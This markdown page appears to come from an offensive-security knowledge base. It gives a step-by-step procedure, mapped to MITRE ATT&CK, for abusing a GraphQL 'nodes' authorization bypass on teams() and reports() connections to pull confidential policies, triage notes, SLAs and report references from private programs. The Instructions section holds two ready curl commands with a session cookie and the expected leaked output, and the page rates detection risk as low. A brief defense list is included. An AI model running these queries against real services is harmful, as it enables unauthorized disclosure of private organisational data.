---
id: proc-uuid-002
tags:
  - graphql
  - metadata-extraction
  - program-data
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/graphql-extensive-user-pii-query]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:26:00.503Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
---
# Extract-Sensitive-Metadata-from-Teams-and-Reports

## Summary

This procedure extends the GraphQL 'nodes' bypass to teams() and reports() connections, disclosing confidential program metadata such as policies, triage notes, SLAs, and references, affecting private programs without proper access controls.

## Description

Building on the users() bypass, this targets additional connection types in the GraphQL schema. The 'nodes' field again provides direct access to unscrubbed objects, revealing internal data like triage notes (internal comments) and policies (confidential rules). Applicable to Ruby-based GraphQL APIs with ActiveRecord, this assumes prior authentication and schema knowledge. The scope is limited by database relations, but it can expose data from multiple private programs, leading to broader information disclosure.

## Requirements

1. Successful completion of initial users bypass for schema validation
2. Authenticated session with access to query teams() and reports()
3. HTTP client for GraphQL POST requests

## Defense

Defensive measures and detection strategies:

- Apply consistent attribute authorization across all connection resolvers in graphql-ruby
- Use query whitelisting or rate limiting on metadata-heavy fields like triage_note
- Log and alert on queries accessing 'nodes' on sensitive connections; integrate with SIEM for anomaly detection
- Database-level views or scopes to mask metadata for unauthorized users

## Objectives

1. Retrieve program policies and triage notes via teams()
2. Extract report references and SLAs via reports()
3. Compile metadata for affected private programs

## Instructions

### Step 1: Query Teams Connection for Policy and Notes

**Context**: Target the teams() connection to access internal program attributes that are normally restricted.

**Command** ([[commands/graphql-extensive-user-pii-query]] adapted):
```bash
curl -X POST https://target.com/graphql -H "Content-Type: application/json" -H "Cookie: session=your_session" -d '{"query": "query { teams() { nodes { policy triage_note } } }"}'
```

> This sends a query focusing on teams. Expected output: JSON with unscrubbed policy texts and triage notes from private teams.

### Step 2: Query Reports Connection for Metadata

**Context**: Extend to reports() to pull sensitive report details like references and SLAs.

**Command** ([[commands/graphql-extensive-user-pii-query]] adapted):
```bash
curl -X POST https://target.com/graphql -H "Content-Type: application/json" -H "Cookie: session=your_session" -d '{"query": "query { reports() { nodes { reference sla } } }"}'
```

> This targets reports. Expected output: Array of reports with exposed metadata, including SLA details and internal references.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Account Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/graphql-extensive-user-pii-query]]

## Tools Used


## Tags

- [[graphql]]
- [[metadata-extraction]]
- [[program-data]]
